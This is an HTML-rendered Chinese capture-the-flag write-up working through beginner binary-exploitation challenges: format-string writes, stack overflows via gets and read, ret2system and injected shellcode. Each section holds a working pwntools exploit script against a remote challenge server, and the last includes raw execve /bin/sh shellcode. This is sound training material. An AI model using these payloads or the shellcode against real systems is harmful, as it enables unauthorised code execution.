<p>&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;payload:</p>
<pre><code class="lang-python">payload=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&apos;-%p&apos;</span>*<span class="hljs-number">10</span><span class="hljs-comment">#%p&#x8868;&#x793A;&#x7528;&#x5730;&#x5740;&#x7684;&#x683C;&#x5F0F;&#x6253;&#x5370;&#x53D8;&#x91CF;&#x7684;&#x503C;</span>
</code></pre>
<p>&#x7136;&#x540E;&#x6254;&#x8FDB;&#x5199;&#x597D;&#x7684;exp&#x6846;&#x67B6;&#x91CC;</p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
payload=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&apos;-%p&apos;</span>*<span class="hljs-number">20</span>
io=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;51832&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;please tell me your name:&quot;</span>,<span class="hljs-string">&quot;eki&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;leave your message please:&quot;</span>,payload)
io.interactive()
</code></pre>
<p>&#x8FD4;&#x56DE;</p>
<pre><code class="lang-bash">hello eki
your message is:
aaaa-0xffedb8de-0xf77755a0-0xf0b5ff-0xffedb90e-0x1-0xc2-0x6b6548fb-0xa69-(nil)-0x61616161-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d
</code></pre>
<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;aaaa&#x5BF9;&#x5E94;&#x7684;&quot;&#x5730;&#x5740;&quot;&#xFF08;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x503C;&#xFF09;0x61616161&#x5728;&#x7B2C;&#x5341;&#x4F4D;&#x51FA;&#x73B0;&#x4E86;</p>
<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x628A;aaaa&#x6362;&#x6210;pwnme&#x7684;&#x5730;&#x5740;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5229;&#x7528;</p>
<p>%n - &#x5230;&#x76EE;&#x524D;&#x4E3A;&#x6B62;&#x6240;&#x5199;&#x7684;&#x5B57;&#x7B26;&#x6570;</p>
<p>&#x628A;8&#x5199;&#x5165;pwnme&#x7684;&#x5730;&#x5740;(&#x53EF;&#x5728;ida pro&#x91CC;&#x627E;&#x5230;)</p>
<p>&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x4FEE;&#x6539;pwnme&#x7684;&#x503C;&#x7684;&#x4EFB;&#x52A1;</p>
<h3 id="payload"><a name="payload" class="anchor-navigation-ex-anchor" href="#payload"><i class="fa fa-link" aria-hidden="true"></i></a>payload</h3>
<pre><code class="lang-python">pwnme_addr=<span class="hljs-number">0x0804A068</span>
payload=p32(pwnme_addr)+<span class="hljs-string">&quot;%04c&quot;</span>+<span class="hljs-string">&quot;%10$n&quot;</span>
<span class="hljs-comment">#%04c&#x7528;&#x4E8E;&#x8F93;&#x51FA;4&#x4E2A;&#x7A7A;&#x5B57;&#x7B26;+p32&#x5730;&#x5740;&#x7684;&#x56DB;&#x4F4D;&#x5C31;&#x7B26;&#x5408;8&#x7684;&#x8981;&#x6C42;&#x4E86; %10$n &#x662F;&#x4E3A;&#x4E86;&#x5C06;%n&#x4F5C;&#x7528;&#x4E8E;&#x7B2C;10&#x4E2A;&#x53C2;&#x6570;&#xFF08;&#x9664;&#x53BB;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x53C2;&#x6570;&#xFF09;</span>
</code></pre>
<h2 id="0x03-whendidyouborn"><a name="0x03-whendidyouborn" class="anchor-navigation-ex-anchor" href="#0x03-whendidyouborn"><i class="fa fa-link" aria-hidden="true"></i></a>0x03 when_did_you_born</h2>
<p>checksec &#x4E00;&#x4E0B;&#x53D1;&#x73B0;&#x662F;64&#x4F4D;&#x7684;elf &#x4E5F;&#x6CA1;&#x6709;PIE</p>
<p>&#x9006;&#x5411;&#x5F97;&#x5230;&#x6838;&#x5FC3;&#x4EE3;&#x7801;</p>
<pre><code class="lang-cpp">__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5); 
<span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">1926</span> )
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Cannot Born In 1926!&quot;</span>);
    result = <span class="hljs-number">0L</span>L;
  }
  <span class="hljs-keyword">else</span>
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&apos;s Your Name?&quot;</span>);
    gets(&amp;v4);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You Are Born In %d\n&quot;</span>, v5);
    <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">1926</span> )
    {
      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Shall Have Flag.&quot;</span>);
      system(<span class="hljs-string">&quot;cat flag&quot;</span>);
    }
</code></pre>
<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x5728;&#x7B2C;&#x4E00;&#x6B65;&#x4E0D;&#x80FD;&#x8BA9;v5=1926</p>
<p>&#x4F46;&#x662F;&#x8981;&#x8BA9;v5&#x5728;&#x7B2C;&#x4E8C;&#x6B65;&#x4E3A;1926</p>
<p>&#x600E;&#x4E48;&#x529E;&#x5462;&#x3002;</p>
<p>&#x4E86;&#x89E3;&#x5230;</p>
<blockquote>
<p>gets&#x4ECE;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x8BFB;&#x5B57;&#x7B26;&#x4E32;&#x51FD;&#x6570;&#xFF0C;&#x5176;&#x53EF;&#x4EE5;&#x65E0;&#x9650;&#x8BFB;&#x53D6;&#xFF0C;&#x4E0D;&#x4F1A;&#x5224;&#x65AD;&#x4E0A;&#x9650;&#xFF0C;&#x4EE5;&#x56DE;&#x8F66;&#x7ED3;&#x675F;&#x8BFB;&#x53D6;&#xFF0C;&#x6240;&#x4EE5;&#x7A0B;&#x5E8F;&#x5458;&#x5E94;&#x8BE5;&#x786E;&#x4FDD;buffer&#x7684;&#x7A7A;&#x95F4;&#x8DB3;&#x591F;&#x5927;&#xFF0C;&#x4EE5;&#x4FBF;&#x5728;&#x6267;&#x884C;&#x8BFB;&#x64CD;&#x4F5C;&#x65F6;&#x4E0D;&#x53D1;&#x751F;&#x6EA2;&#x51FA;&#x3002;</p>
</blockquote>
<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6EA2;&#x51FA;&#x7684;&#x65B9;&#x5F0F;&#x628A;&#x672C;&#x6765;&#x5E94;&#x8BE5;&#x5728;v4&#x91CC;&#x7684;&#x6570;&#x636E;&#x8986;&#x76D6;&#x5230;v5&#x4E0A;</p>
<p>&#x901A;&#x8FC7;ida&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;</p>
<pre><code class="lang-cpp">  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span>
  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span>
  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>
</code></pre>
<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;v4&#x548C;v5&#x76F8;&#x5DEE;8&#x4F4D;,&#x53EF;&#x6784;&#x9020;</p>
<h3 id="payload_1"><a name="payload_1" class="anchor-navigation-ex-anchor" href="#payload_1"><i class="fa fa-link" aria-hidden="true"></i></a>Payload</h3>
<pre><code class="lang-python">payload=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">1926</span>)
</code></pre>
<h3 id="exp_1"><a name="exp_1" class="anchor-navigation-ex-anchor" href="#exp_1"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
payload=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">1926</span>)
io=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;44355&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;What&apos;s Your Birth?&quot;</span>,<span class="hljs-string">&quot;1234&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;What&apos;s Your Name?&quot;</span>,payload)
io.interactive()
</code></pre>
<h2 id="0x04-hellopwn"><a name="0x04-hellopwn" class="anchor-navigation-ex-anchor" href="#0x04-hellopwn"><i class="fa fa-link" aria-hidden="true"></i></a>0x04 hello_pwn</h2>
<p>&#x548C;&#x4E0A;&#x4E00;&#x9898;&#x7C7B;&#x4F3C;</p>
<p>&#x4E5F;&#x662F;&#x6EA2;&#x51FA;&#x8986;&#x76D6;</p>
<pre><code class="lang-cpp">  read(<span class="hljs-number">0</span>, &amp;unk_601068, <span class="hljs-number">0x10</span>uLL);
  <span class="hljs-keyword">if</span> ( dword_60106C == <span class="hljs-number">1853186401</span> )
    sub_400686();
</code></pre>
<blockquote>
<p>ssize_t read (int fd, void *buf, size_t count);</p>
<p>read()&#x662F;&#x4E00;&#x4E2A;&#x8BA1;&#x7B97;&#x673A;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x51FD;&#x6570;&#xFF0C;&#x4F1A;&#x628A;&#x53C2;&#x6570;fd&#x6240;&#x6307;&#x7684;&#x6587;&#x4EF6;&#x4F20;&#x9001;nbyte&#x4E2A;&#x5B57;&#x8282;&#x5230;buf&#x6307;&#x9488;&#x6240;&#x6307;&#x7684;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x82E5;&#x53C2;&#x6570;nbyte&#x4E3A;0&#xFF0C;&#x5219;read()&#x4E0D;&#x4F1A;&#x6709;&#x4F5C;&#x7528;&#x5E76;&#x8FD4;&#x56DE;0&#x3002;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;&#x5B9E;&#x9645;&#x8BFB;&#x53D6;&#x5230;&#x7684;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x8FD4;&#x56DE;0&#xFF0C;&#x8868;&#x793A;&#x5DF2;&#x5230;&#x8FBE;&#x6587;&#x4EF6;&#x5C3E;&#x6216;&#x65E0;&#x53EF;&#x8BFB;&#x53D6;&#x7684;&#x6570;&#x636E;&#x3002;&#x9519;&#x8BEF;&#x8FD4;&#x56DE;-1,&#x5E76;&#x5C06;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#x9002;&#x5F53;&#x7684;&#x8BBE;&#x7F6E;&#x9519;&#x8BEF;&#x7801;&#x3002;</p>
</blockquote>
<p>&#x5728;ida pro&#x91CC;&#x770B;&#x8FD9;&#x4E24;&#x4E2A;&#x7684;&#x5730;&#x5740;</p>
<pre><code class="lang-asm">.bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B&#x2191;o
.bss:0000000000601069                 db    ? ;
.bss:000000000060106A                 db    ? ;
.bss:000000000060106B                 db    ? ;
.bss:000000000060106C dword_60106C    dd ?                    ; DATA XREF: main+4A&#x2191;r
</code></pre>
<p>&#x5DEE;&#x56DB;&#x4E2A;&#x5B57;&#x8282;&#x8986;&#x76D6;&#x5230;dword_60106c&#xFF0C;&#x4E8E;&#x662F;&#x6784;&#x9020;</p>
<h3 id="payload_2"><a name="payload_2" class="anchor-navigation-ex-anchor" href="#payload_2"><i class="fa fa-link" aria-hidden="true"></i></a>payload</h3>
<pre><code class="lang-python">payload=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4</span>+p64(<span class="hljs-number">1853186401</span>)
</code></pre>
<h3 id="exp_2"><a name="exp_2" class="anchor-navigation-ex-anchor" href="#exp_2"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
payload=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4</span>+p64(<span class="hljs-number">1853186401</span>)

io=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;46962&quot;</span>)
io.recvuntil(<span class="hljs-string">&quot;lets get helloworld for bof&quot;</span>)
io.send(payload)
io.interactive()
</code></pre>
<h2 id="0x05-level0"><a name="0x05-level0" class="anchor-navigation-ex-anchor" href="#0x05-level0"><i class="fa fa-link" aria-hidden="true"></i></a>0x05 level0</h2>
<p>checksec &#x4E00;&#x4E0B; &#x53D1;&#x73B0;&#x662F;amd64&#x7684;&#x7A0B;&#x5E8F; &#x6CA1;&#x6709;&#x5F00;RELRO&#xFF0C;STACK&#x548C;PIE</p>
<p>&#x653E;&#x8FDB;IDA pro&#x91CC;&#x53D1;&#x73B0;callsystem&#x540E;&#x95E8;</p>
<p>&#x53C8;&#x5728;vulnerable_function()&#x91CC;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x5185;&#x5BB9;</p>
<pre><code class="lang-cpp"><span class="hljs-keyword">ssize_t</span> vulnerable_function()
{
  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-80h]</span>

  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x200</span>uLL);
}
</code></pre>
<p>0x200ull&#x663E;&#x7136;&#x53EF;&#x4EE5;&#x9020;&#x6210;&#x6EA2;&#x51FA;&#x8986;&#x76D6;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x6EA2;&#x51FA;&#x5230;rbp(64&#x4F4D;&#x7CFB;&#x7EDF;8&#x5B57;&#x8282;)&#x540E;&#x4FEE;&#x6539;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x7684;return&#x503C;&#x4F7F;&#x4E4B;&#x8DF3;&#x8F6C;&#x5230;callsystem&#x7684;&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x62FF;&#x5230;&#x540E;&#x95E8;</p>
<h3 id="exp_3"><a name="exp_3" class="anchor-navigation-ex-anchor" href="#exp_3"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

payload=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x400596</span>)

dist=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;31258&quot;</span>)

dist.recvuntil(<span class="hljs-string">&quot;Hello, World&quot;</span>)
dist.send(payload)
dist.interactive()
</code></pre>
<h2 id="0x06-level2"><a name="0x06-level2" class="anchor-navigation-ex-anchor" href="#0x06-level2"><i class="fa fa-link" aria-hidden="true"></i></a>0x06 level2</h2>
<p>&#x8FD8;&#x662F;&#x60EF;&#x4F8B;&#x62FF;checksec &#x5206;&#x6790;</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p>&#x62D6;&#x8FDB;IDA pro</p>
<p>&#x770B;&#x5230;</p>
<pre><code class="lang-cpp"><span class="hljs-keyword">ssize_t</span> vulnerable_function()
{
  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-88h]</span>

  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);
  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>u);
}
</code></pre>
<p>&#x548C;&#x4E0A;&#x9898;&#x4E00;&#x6837; &#x5B58;&#x5728;&#x6808;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;</p>
<p>&#x4F46;&#x662F;&#x8FD9;&#x56DE;&#x6CA1;&#x6709;&#x73B0;&#x6210;&#x7684;&#x540E;&#x95E8;&#x4E86;</p>
<p>&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x6709;system&#x547D;&#x4EE4;&#x5730;&#x5740;&#x554A;</p>
<p>&#x7136;&#x540E;&#x5728;ida pro string &#x7684;&#x7A97;&#x53E3;&#x91CC;&#x53C8;&#x627E;&#x5230;&#x4E86;</p>
<pre><code>Address    Length    Type    String
.data:0804A024    00000008    C    /bin/sh
</code></pre><p>&#x901A;&#x8FC7;&#x6784;&#x9020;&#x4F2A;&#x6808;&#x5E27;</p>
<p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x547D;&#x4EE4;system(&quot;/bin/sh&quot;)</p>
<h3 id="payload_3"><a name="payload_3" class="anchor-navigation-ex-anchor" href="#payload_3"><i class="fa fa-link" aria-hidden="true"></i></a>Payload:</h3>
<pre><code class="lang-python">shell_addr = <span class="hljs-number">0x0804A024</span>
system_addr = <span class="hljs-number">0x08048320</span>

payload= <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>)+p32(system_addr)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x04</span>+p32(shell_addr)
</code></pre>
<p>0x88&#x7528;&#x4E8E;&#x8986;&#x76D6;&#x7F13;&#x51B2;&#x533A;&#xFF0C;0x04&#x7528;&#x4E8E;&#x8986;&#x76D6;ebp&#x5730;&#x5740;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x63A5;&#x7740;&#x8986;&#x5199;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x4E3A;system_addr(system&#x7684;&#x6808;&#x5E27;&#x4E2D;&#x7684;ebp&#x5730;&#x5740;)&#xFF0C;0x04&#x586B;&#x5145;system&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#xFF0C;p32(shell_addr)&#x81EA;&#x7136;&#x5C31;&#x662F;system&#x7684;&#x53C2;&#x6570;</p>
<h3 id="exp_4"><a name="exp_4" class="anchor-navigation-ex-anchor" href="#exp_4"><i class="fa fa-link" aria-hidden="true"></i></a>Exp:</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

shell_addr = <span class="hljs-number">0x0804A024</span>
system_addr = <span class="hljs-number">0x08048320</span>

payload= <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>)+p32(system_addr)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x04</span>+p32(shell_addr)

io=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;35613&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload)
io.interactive()
</code></pre>
<h2 id="0x07-string"><a name="0x07-string" class="anchor-navigation-ex-anchor" href="#0x07-string"><i class="fa fa-link" aria-hidden="true"></i></a>0x07 string</h2>
<p>checksec:</p>
<pre><code class="lang-bash">Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
</code></pre>
<p>&#x62D6;&#x8FDB;IDA&#x91CC;&#xFF0C;&#x53D1;&#x73B0;&#x6709;&#x597D;&#x591A;&#x51FD;&#x6570;</p>
<blockquote>
<p>tips:&#x53EF;&#x4EE5;&#x5728;IDA pro&#x5185;&#x66FF;&#x6362;&#x51FD;&#x6570;&#x540D;&#x4F7F;&#x7A0B;&#x5E8F;&#x53D8;&#x5F97;&#x66F4;&#x6E05;&#x6670;</p>
</blockquote>
<p>&#x5206;&#x6790;&#x51FD;&#x6570;&#xFF0C;&#x5176;&#x4E2D;&#x6709;</p>
<pre><code class="lang-cpp">  <span class="hljs-keyword">if</span> ( *a1 == a1[<span class="hljs-number">1</span>] )
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);
    v1 = mmap(<span class="hljs-number">0L</span>L, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">33</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0L</span>L);
    read(<span class="hljs-number">0</span>, v1, <span class="hljs-number">0x100</span>uLL);
    ((<span class="hljs-keyword">void</span> (__fastcall *)(_QWORD, <span class="hljs-keyword">void</span> *))v1)(<span class="hljs-number">0L</span>L, v1);<span class="hljs-comment">//v1&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x88AB;&#x5F53;&#x4F5C;&#x4E00;&#x6BB5;&#x51FD;&#x6570;&#x6267;&#x884C;</span>
  }
</code></pre>
<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;v1&#x91CC;&#x585E;&#x4E00;&#x6BB5;shellcode&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;getshell&#x4E86;</p>
<p>&#x4E3A;&#x4E86;&#x4F7F;&#x7A0B;&#x5E8F;&#x8FDB;&#x5165;&#x8BE5;&#x8BED;&#x53E5;&#x5757;&#xFF0C;&#x9700;&#x8981;*a1==a1[0]</p>
<p>&#x4E5F;&#x5373;a[0]==a[1]</p>
<p>&#x5206;&#x6790;&#x8BE5;&#x51FD;&#x6570;&#x53D1;&#x73B0;a&#x662F;&#x5B50;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x7684;&#x53C2;&#x6570;</p>
<p>&#x56DE;&#x5230;&#x4E0A;&#x4E0A;&#x4E00;&#x7EA7;&#x8C03;&#x7528;&#x51FD;&#x6570;&#xFF0C;&#x5728;main()&#x91CC;</p>
<p>a&#x662F;v3[0]&#x7684;&#x5730;&#x5740;,v3[0]=68,v3[1]=85</p>
<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8981;&#x628A;v3[0]&#x4FEE;&#x6539;&#x6210;85</p>
<p>&#x518D;&#x5206;&#x6790;&#x51FD;&#x6570;</p>
<p>&#x6211;&#x4EEC;&#x53D1;&#x73B0;</p>
<pre><code class="lang-cpp">  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);


  _isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);
  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">1</span> )
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;A voice heard in your mind&quot;</span>);
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&apos;Give me an address&apos;&quot;</span>);
    _isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v2);
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And, you wish is:&quot;</span>);
    _isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;format);
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your wish is&quot;</span>);
    <span class="hljs-built_in">printf</span>(&amp;format, &amp;format);<span class="hljs-comment">//&#x6EA2;&#x51FA;&#x70B9;</span>
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I hear it, I hear it....&quot;</span>);
  }
</code></pre>
<p>&#x6839;&#x636E;&#x4E4B;&#x524D;&#x89E3;&#x9898;&#x7684;&#x7ECF;&#x9A8C;&#xFF0C;&#x663E;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;printf&#x4E0A;&#x505A;&#x6587;&#x7AE0;&#x4E86;</p>
<p>&#x6211;&#x4EEC;&#x5148;&#x770B;&#x770B;format&#x7684;&#x504F;&#x79FB;&#x91CF;</p>
<pre><code class="lang-python">payload=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&quot;-p&quot;</span>*<span class="hljs-number">10</span>
</code></pre>
<p>&#x8FD4;&#x56DE;</p>
<pre><code class="lang-bash">Your wish is
AAAAAAAA-0x7f703600d6a3-0x7f703600e780-0x7f7035d3f2c0-0x7f7036235700-0x7f7036235700-0x100000022-0x19ed010-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70I hear it, I hear it....
</code></pre>
<p>&#x504F;&#x79FB;&#x91CF;&#x4E3A;8&#x4F4D;&#xFF0C;</p>
<p>&#x4F46;&#x662F;&#x8FD9;&#x56DE;&#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x5BF9;v3&#x7684;&#x503C;&#x76F4;&#x63A5;&#x6CE8;&#x5165;&#x4E86;,&#x56E0;&#x4E3A;&#x4ED6;&#x4E0D;&#x5728;&#x91CC;&#x51FD;&#x6570;&#x7684;&#x6808;&#x91CC;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x5728;&#x4E00;&#x5F00;&#x59CB;&#xFF0C;&#x7A0B;&#x5E8F;&#x5DF2;&#x7ECF;&#x5C06;v4&#x7684;&#x503C;&#xFF08;&#x5373;v3&#x5BF9;&#x5E94;&#x7684;&#x5730;&#x5740;&#x544A;&#x8BC9;&#x6211;&#x4EEC;&#x4E86;&#xFF09;,&#x800C;&#x51FD;&#x6570;&#x6808;&#x4E2D;v2&#x7684;&#x503C;&#x53C8;&#x662F;&#x53EF;&#x63A7;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5411;v2&#x6240;&#x4EE3;&#x8868;&#x7684;&#x5730;&#x5740;&#x91CC;&#x6CE8;&#x5165;&#x503C;&#x7684;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;pwn</p>
<p>&#x53C8;&#x56E0;&#x4E3A;&#x5728;&#x51FD;&#x6570;&#x4E2D;&#x770B;&#x5230;v2&#x548C;format&#x76F8;&#x5DEE;&#x4E00;&#x4F4D; &#xFF08;0x19ed010&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x6784;&#x9020;</p>
<h3 id="payload_4"><a name="payload_4" class="anchor-navigation-ex-anchor" href="#payload_4"><i class="fa fa-link" aria-hidden="true"></i></a>Payload</h3>
<pre><code class="lang-python">payload=<span class="hljs-string">&quot;%085d&quot;</span>+<span class="hljs-string">&quot;%7$n&quot;</span>
</code></pre>
<h3 id="exp_5"><a name="exp_5" class="anchor-navigation-ex-anchor" href="#exp_5"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
payload=<span class="hljs-string">&quot;%85d&quot;</span>+<span class="hljs-string">&quot;%7$n&quot;</span>
shellcode=<span class="hljs-string">&quot;\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05&quot;</span>
io=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;52943&quot;</span>)
io.recvuntil(<span class="hljs-string">&quot;secret[0] is &quot;</span>)
v3_addr=io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)
v3_address=eval(<span class="hljs-string">&quot;0x&quot;</span>+v3_addr[:<span class="hljs-number">-1</span>])
io.sendlineafter(<span class="hljs-string">&quot;What should your character&apos;s name be:&quot;</span>,<span class="hljs-string">&quot;eki&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;So, where you will go?east or up?:&quot;</span>,<span class="hljs-string">&quot;east&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;&apos;Give me an address&apos;&quot;</span>,str(v3_address))
<span class="hljs-comment">#io.sendlineafter(&quot;And, you wish is:&quot;,&apos;A&apos;*8+&apos;-%p&apos;*10)</span>
io.sendlineafter(<span class="hljs-string">&quot;And, you wish is:&quot;</span>,payload)
io.recvuntil(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>)
io.send(shellcode)
io.interactive()
</code></pre>
<blockquote>
<p>&#x53EF;&#x4EE5;&#x5728;shell-storm&#x4E0A;&#x627E;&#x5230;&#x5BF9;&#x5E94;&#x67B6;&#x6784;&#x548C;&#x7CFB;&#x7EDF;&#x7684;shellcode </p>
<p>&#x4E5F;&#x53EF;&#x4F7F;&#x7528;pwntool&#x81EA;&#x5E26;&#x7684;&#x751F;&#x6210;&#x5DE5;&#x5177;asm(shellcraft.sh())&#x751F;&#x6210;</p>
<p>&#x9700;&#x8981;&#x6307;&#x5B9A; context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</p>
</blockquote>
<p>&#x6CE8;&#x610F;v2&#x672C;&#x8EAB;&#x662F;&#x4E2A;&#x4EE5;int&#x5B58;&#x7684;&#x5730;&#x5740;&#x6240;&#x4EE5;&#x4E0D;&#x9700;&#x8981;&#x7528;p64&#x8FDB;&#x884C;&#x5730;&#x5740;&#x8F6C;&#x6362;</p>
